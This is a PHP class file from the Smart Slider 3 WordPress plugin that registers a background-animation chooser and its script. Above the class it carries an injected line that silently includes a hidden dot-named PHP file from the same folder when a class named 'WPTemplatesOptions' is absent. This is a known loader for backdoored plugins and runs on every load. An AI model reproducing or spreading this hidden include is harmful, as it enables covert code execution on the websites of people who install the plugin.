<?php


namespace Nextend\SmartSlider3\Form\Element;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Form\Element\AbstractChooser;
use Nextend\SmartSlider3\Slider\SliderType\Simple\SliderTypeSimple;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BackgroundAnimation extends AbstractChooser {


    protected function addScript() {

        Js::addStaticGroup(SliderTypeSimple::getAssetsPath() . '/dist/smartslider-backgroundanimation.min.js', 'smartslider-backgroundanimation');

        Js::addInline('new N2Classes.FormElementAnimationManager("' . $this->fieldID . '", "backgroundanimationManager");');
    }
}